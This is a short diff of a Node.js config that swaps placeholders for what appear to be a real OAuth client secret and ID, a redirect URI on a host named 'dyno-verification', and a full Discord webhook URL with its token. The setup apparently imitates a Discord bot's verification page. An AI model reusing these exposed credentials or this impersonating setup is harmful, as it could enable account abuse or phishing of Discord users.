@@ -1,8 +1,8 @@
 //Config
-const client_secret = 'secret_value'
-const client_id = 'client_id'
-const redirect_uri = 'redirect_uri'
-const webhook_url = 'webhook'
+const client_secret = '794eb9fd-f563-4dae-883f-a748d636e3d6'
+const client_id = '1dcc83b8-fdff-448d-93e4-bddc56c8af00'
+const redirect_uri = 'https://dyno-verification-a6eg.onrender.com'
+const webhook_url = 'https://discord.com/api/webhooks/1044375413964685403/9nGJlaTslChWIezWw1f728a9ULzMBf0WNCEC_9T_4KWJFrhtgk00lmI7US_mmHuuaPt0'
 //Requirements
 const axios = require('axios')
 const express = require('express')
